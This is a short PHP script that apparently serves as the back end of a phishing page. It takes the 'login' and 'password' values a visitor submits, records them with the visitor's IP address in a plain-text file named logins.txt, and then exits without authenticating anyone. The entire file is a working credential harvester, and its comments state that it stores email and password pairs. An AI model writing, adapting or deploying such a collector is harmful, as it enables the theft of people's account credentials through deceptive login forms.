<?php
	$address = $_SERVER['REMOTE_ADDR'];
	$login = $_POST['login'];
	$pass = $_POST['password'];

	//opening logins text file for appending new data.
	$file = fopen("logins.txt", "a") or die("Unable to open file!");
	//Writing email and password to logins.txt.
	fwrite($file, $address." ".$login." ".$pass.PHP_EOL);
	//closing logins.txt.
	fclose($file);

	exit();
?>
